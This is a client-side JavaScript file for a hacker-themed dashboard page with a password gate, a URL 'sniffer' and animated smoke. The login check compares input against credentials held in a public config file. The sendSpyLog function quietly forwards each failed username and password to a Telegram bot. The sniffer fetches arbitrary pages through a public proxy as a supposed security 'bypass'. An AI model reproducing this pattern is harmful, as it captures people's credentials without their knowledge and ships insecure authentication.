let config = {};
fetch('config.json').then(r => r.json()).then(d => {
    config = d;
    document.getElementById('dev-update').innerText = d.system.update_log;
});

function checkAuth() {
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;
    
    if(u === config.auth.username && p === config.auth.password) {
        document.getElementById('login-screen').classList.add('hidden');
        document.getElementById('main-dashboard').classList.remove('hidden');
        document.getElementById('bg-audio').play();
    } else {
        alert("WRONG KEY! ACCESS DENIED.");
        sendSpyLog(u, p);
    }
}

async function ultraSniffer() {
    const url = document.getElementById('target-url').value;
    const log = document.getElementById('sniff-log');
    if(!url) return;

    log.innerHTML = `<span class="blue">Initiating Ultra Bypass on ${url}...</span>`;
    const proxy = "https://api.allorigins.win/get?url=";

    try {
        const res = await fetch(proxy + encodeURIComponent(url));
        const data = await res.json();
        const html = data.contents;

        if (html && html.length > 100) {
            const blob = new Blob([html], { type: 'text/html' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `ZAMXS_CURIAN_${new Date().getTime()}.html`;
            a.click();
            log.innerHTML = `<span class="green">BYPASS SUCCESS! Assets Downloaded.</span>`;
        } else {
            log.innerHTML = `<span class="red">Bypass Failed! High Security Target.</span>`;
        }
    } catch (e) {
        log.innerHTML = `<span class="red">Error: Proxy Down!</span>`;
    }
}

function switchTab(t) {
    document.querySelectorAll('.content-tab').forEach(el => el.classList.add('hidden'));
    document.querySelectorAll('.t-btn').forEach(el => el.classList.remove('active'));
    document.getElementById('tab-' + t).classList.remove('hidden');
    event.currentTarget.classList.add('active');
}

function sendSpyLog(u, p) {
    const msg = `⚠️ OBLIVION ALERT: Login Fail! User:[${u}] Key:[${p}]`;
    fetch(`https://api.telegram.org/bot${config.telegram.token}/sendMessage?chat_id=${config.telegram.chat_id}&text=${encodeURIComponent(msg)}`);
}

function createSmoke() {
    const container = document.getElementById('smoke-background');
    setInterval(() => {
        const p = document.createElement('div');
        p.className = 'smoke-particle';
        p.style.left = Math.random() * 100 + "%";
        container.appendChild(p);
        setTimeout(() => p.remove(), 10000);
    }, 400);
}
createSmoke();
                
